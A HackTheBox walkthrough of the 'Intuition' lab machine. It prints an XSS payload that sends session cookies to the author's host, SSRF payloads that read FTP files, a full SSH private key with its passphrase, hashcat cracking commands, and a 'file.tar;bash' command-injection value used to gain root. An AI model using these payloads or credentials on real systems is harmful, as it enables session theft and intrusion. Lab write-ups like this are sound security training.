---
title: "Intuition Writeup - HackTheBox"
date: 2024-09-15
draft: false
Tags:
- HackTheBox
- Linux
- Hard
---

| Link: | [https://app.hackthebox.com/machines/Intuition](https://app.hackthebox.com/machines/Intuition) |
| --- | --- |
| Difficulty | Hard |
| Machine | Linux |

---

## Enumeration

### **Nmap Scan**

I started with an Nmap scan to identify open ports on the target machine. The scan revealed two open ports:

- Port 22: SSH
- Port 80: HTTP

Next, I conducted an aggressive scan to gather more detailed information about the services running on these ports. The results provided insights into potential vulnerabilities and configurations that could be exploited.

```xml
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS2jzf8Eqy8cVa20hyZcem8rwAzeRhrMNEGdSUcFmv1FiQsfR4F9vZYkmfKViGIS3uL3X/6sJjzGxT1F/uPm/U=
|   256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj9hE1zqO6TQ2JpjdgvMm6cr6s6eYsQKWlROV4G6q+4
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When I navigated to the web service running on port 80, I was greeted with the initial site. This gave me a first look at the target's web interface and allowed me to begin assessing potential entry points or vulnerabilities in the web application.

![Untitled](Untitled.png)

During my exploration, I discovered several subdomains associated with the target:

- **report.comprezzor.htb**
- **auth.comprezzor.htb**
- **dashboard.comprezzor.htb** (requires login as an authorized user)

## User Flag

To gain unauthorized access, I decided to attempt stealing cookies using a cross-site scripting (XSS) vulnerability. I used the bug report form on **report.comprezzor.htb** for this purpose. Here is the payload I used:

```html
<script>var i=new Image(); i.src="http://10.10.14.102:80/?cookie="+btoa(document.cookie);</script>
```

This payload successfully captured the cookie by sending the cookie data to my server at **`http://10.10.14.102`**. With this session cookie, I could potentially access restricted areas like **dashboard.comprezzor.htb**, demonstrating a significant security flaw that could be exploited for further penetration testing.

After countless attempts and troubleshooting, I finally managed to capture the session cookie. This involved restarting the processes and refining my methods multiple times, but persistence paid off.

```xml
10.129.54.146 - - [28/Apr/2024 11:51:15] "GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 404 -
10.129.54.146 - - [28/Apr/2024 11:51:15] code 404, message File not found
10.129.54.146 - - [28/Apr/2024 11:51:15] "GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 404 -
```

![Untitled](Untitled%201.png)

Using the stolen cookie, I accessed the "Create PDF Report" site. From here, I executed a Server-Side Request Forgery (SSRF) attack by manipulating the report URL to send a request to my own HTTP server. This allowed me to intercept and analyze the server's response.

Through this SSRF attack, I received a new cookie:

```
eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRzZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
```

![Untitled](Untitled%202.png)

![Untitled](Untitled%203.png)

By leveraging the SSRF vulnerability, I noticed that the reply contained the following user agent:

```makefile
User-Agent: Python-urllib/3.11
```

This indicated that the application might be using a Python script to handle requests. Recognizing the potential for exploitation, I researched and found relevant exploits, including one discussed in [this GitHub issue](https://github.com/python/cpython/issues/102153).

Utilizing this CVE, I managed to retrieve the source code of the application via the SSRF attack. Access to the source code provided valuable insights into the internal workings of the application, including potential vulnerabilities and misconfigurations.

![Untitled](Untitled%204.png)

Using the SSRF vulnerability, I targeted the specific path where the application code was likely stored. By sending a request to fetch **`python3/app/code/app.py`**, I successfully retrieved the source code of the Flask application.

![Untitled](Untitled%205.png)

![Untitled](Untitled%206.png)

![Untitled](Untitled%207.png)

By analyzing the source code retrieved from **`python3/app/code/app.py`**, I developed a blueprint to help navigate and identify interesting components within the application. This blueprint focused on key areas such as routes, functions, and any hardcoded sensitive information.

```xml
project_folder/
│
├── app.py
│
├── blueprints/
│   ├── __init__.py
│   │
│   ├── index/
│   │   ├── __init__.py
│   │   └── index.py
│   │
│   ├── report/
│   │   ├── __init__.py
│   │   └── report.py
│   │
│   ├── auth/
│   │   ├── __init__.py
│   │   └── auth.py
│   │
│   └── dashboard/
│       ├── __init__.py
│       └── dashboard.py
│
└── static/
    ├── css/
    ├── js/
    └── ...

```

With the useful code extracted from **`dashboard.py`** using the SSRF vulnerability, we can analyze it to identify critical functionalities, potential vulnerabilities, and further actions for exploitation.

```xml
try:
    ftp = FTP('ftp.local')
    ftp.login(user='ftp_admin', passwd='u3jai8y71s2')
    ftp.cwd('/')
    with open(backup_filename, 'rb') as file:
        ftp.storbinary(f'STOR {backup_filename}', file)
    ftp.quit()
    os.remove(backup_filename)
    flash('Backup and upload completed successfully!', 'success')
except Exception as e:
    flash(f'Error: {str(e)}', 'error')
    return redirect(url_for('dashboard.dashboard'))

```

In the code above, I noticed FTP credentials. I'll utilize the SSRF method to connect to this FTP.

```bash
ftp://ftp_admin:u3jai8y71s2@ftp.local/
```

![Untitled](Untitled%208.png)

I used the FTP credentials as an SSRF payload from the previous step. We observed there is a private key. I attempt to view it.

![Untitled](Untitled%209.png)

With this payload, I will attempt to view the private key located at the following FTP URL: **`ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key`**.

```xml
-----BEGIN OPENSSH PRIVATE KEY-----
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
XxwXArPr6+HQe9hZSjI2hjYC2OU=
-----END OPENSSH PRIVATE KEY-----
```

There is also a passphrase "**`Y27SH19HDIWD`**" on the FTP server, which we can retrieve using the following payload:

**`report_url=++++ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt`**

Now I will execute **`ssh-add`** to extract the username from the **`id_rsa`** file.

```xml
┌──(kali㉿kali)-[~/s5]
└─$ ssh-add id_rsa
Enter passphrase for id_rsa: 
Identity added: id_rsa (dev_acc@local)
```

It indicates that the user is **`dev_acc`**. Now, I will SSH to the user using the command: **`ssh dev_acc@10.129.54.146 -i id_rsa`**.

![Untitled](Untitled%2010.png)

We successfully obtained the user flag! 🚩

## Root Flag

Now, I'll run LinPEAS by fetching it from my host system using a HTTP server created with Python.

```xml
╔══════════╣ Users with console
adam:x:1002:1002:,,,:/home/adam:/bin/bash                                                                                                                                                                         
dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash
lopez:x:1003:1003:,,,:/home/lopez:/bin/bash
root:x:0:0:root:/root:/bin/bash

```

After LinPEAS finished running, I made note of the users in case we might need them later.

Additionally, I found a users.db file in the blueprints directory. I will view its contents using **`cat`** to see if we can gather any information.

The users.db file contains a hash for the user "adam". We can attempt to crack it using hashcat, John the Ripper, or any other preferred tool.

```
����P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�3�EtableusersusersCREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    role TEXT DEFAULT 'user'
,�,##w��h�=adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevh�=adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin
������

```

After cracking the hash for user "adam" using hashcat with the command:

```bash
hashcat.exe -m 30120 myhash.txt rockyou.txt
```

The credentials for user "adam" are:

```
username: adam
password: adam gray
```

I conducted further enumeration and discovered valid credentials for another user.

```bash
dev_acc@intuition:/$ zgrep -i lopez /var/log/suricata/*.gz
/var/log/suricata/eve.json.7.gz:{"timestamp":"2023-09-28T17:43:36.099184+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
/var/log/suricata/eve.json.7.gz:{"timestamp":"2023-09-28T17:43:52.999165+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"PASS","command_data":"Lopezzz1992%123","completion_code":["530"],"reply":["Authentication failed."],"reply_received":"yes"}}
/var/log/suricata/eve.json.7.gz:{"timestamp":"2023-09-28T17:44:32.133372+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
/var/log/suricata/eve.json.7.gz:{"timestamp":"2023-09-28T17:44:48.188361+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"PASS","command_data":"Lopezz1992%123","completion_code":["230"],"reply":["Login successful."],"reply_received":"yes"}}
```

I obtained the password for user "lopez." It is **`Lopezz1992%123`**. I used this password to access the account of user "lopez."

I also gained access to FTP using:

```bash
lopez@intuition:~$ ftp adam@127.0.0.1
Connected to 127.0.0.1.
220 pyftpdlib 1.5.7 ready.
331 Username ok, send password.
Password: adam gray
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
```

I retrieved all the cool stuff from there using the **`get <file_name>`** command:

- **`payload.txt`**
- **`runner1`**
- **`runner1.c`**
- **`run-tests.sh`**

The "run-tests.sh" file contains:

```bash
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"

```

The "runner1.c" file contains the authentication code, but it's hashed in MD5. I will save it somewhere naming `myhash.txt`.

I cracked the auth code from run-tests.sh file using the following command as we knew the first part of the authentication key **`UHI75GHI****`**and the hash was available in runner1.c:

```css
hashcat.exe -a3 -m0 myhash.txt UHI75GHI?u?u?u?u --self-test-disable
```

The cracked hash is **`UHI75GHINKOP`**.

![Untitled](Untitled%2011.png)

I created a file named "exploit.json" containing:

```json
{
  "run":{
        "action":"install",
        "role_file":"file.tar"
        },
  "auth_code":"UHI75GHINKOP"
}
```

We know the injection point is **`role_file`**. We need to perform command injection from **`role_file`** now. I renamed my file from **`file.tar`** to **`file.tar;bash`**. Now, I will adjust the payload in **`exploit.json`** accordingly.

```json
{
  "run":{
        "action":"install",
        "role_file":"file.tar;bash"
        },
  "auth_code":"UHI75GHINKOP"
}
```

I ran **`sudo /opt/runner2/runner2 exploit.json`** again.

```json
root@intuition:/home/lopez# cd ~
root@intuition:~# cat root.txt
[ROOT_FLAG_R3DACT3D]
root@intuition:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Boom! We now have root access. 🎉🚀

## Conclusion

Thanks for following along with my walkthrough! Using various tools and techniques, we successfully identified vulnerabilities, exploited them, and gained root access. Keep exploring and happy hacking!
